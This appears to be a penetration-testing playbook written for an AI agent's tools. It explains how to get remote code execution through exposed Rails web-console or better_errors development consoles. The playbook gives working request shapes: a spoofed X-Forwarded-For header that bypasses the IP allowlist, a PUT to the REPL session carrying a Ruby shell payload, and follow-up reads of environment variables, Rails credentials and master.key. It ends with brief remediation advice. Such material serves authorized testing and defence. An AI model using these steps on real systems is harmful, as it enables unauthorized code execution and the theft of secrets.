# Exposed dev console RCE (web-console / better_errors)

`web-console` (default dev Gemfile) mounts a live Ruby REPL on every error page —
full RCE, no gadget, if `RAILS_ENV=development` leaks or the IP allowlist is loose.

1. **Trigger an error page**: `browser_navigate` to a bogus path or force a 500.
   Read the body with `http_flow_body` — console-enabled pages carry
   `data-remote-path=` (legacy) or `data-mount-point=`/`data-session-id=`
   attributes near the trace.
2. **IP allowlist bypass**: `web-console` restricts to `config.web_console.
   permissions` (loopback by default). On the SAME triggering request add
   `http_request(headers:{"X-Forwarded-For":"127.0.0.1"})` — misconfigured/older
   deployments trust the spoofed header (CVE-2015-3224).
3. **Run code**: `http_request(method:"PUT",
   url:"<mount_point>/repl_sessions/<session_id>",
   headers:{"Accept":"application/vnd.web-console.v2",
   "X-Requested-With":"XMLHttpRequest","X-Forwarded-For":"127.0.0.1"},
   body:"input=" + encodeURIComponent('%x(id)'))`. The evaluated result comes
   back INLINE in the response body — no OOB needed.
4. **better_errors** (no web-console): same shape but interactive-only — the
   `__better_errors` iframe exposes a console per traceback frame;
   `browser_snapshot` the error page, click the console `ref`, `browser_type`
   the Ruby (`` `id` ``) into the prompt.
5. **Escalate**: read `ENV`, `Rails.application.credentials`, or
   `File.read('config/master.key')` straight from the REPL — a shortcut past
   skill: session-cookie-crypto's leak-vector hunting.

Evidence: command output (`uid=`) returned inline by the REPL.
Remediation: never run `RAILS_ENV=development` reachable from outside; drop
`web-console`/`better_errors` from the production Gemfile group; don't widen
`config.web_console.permissions` past loopback.
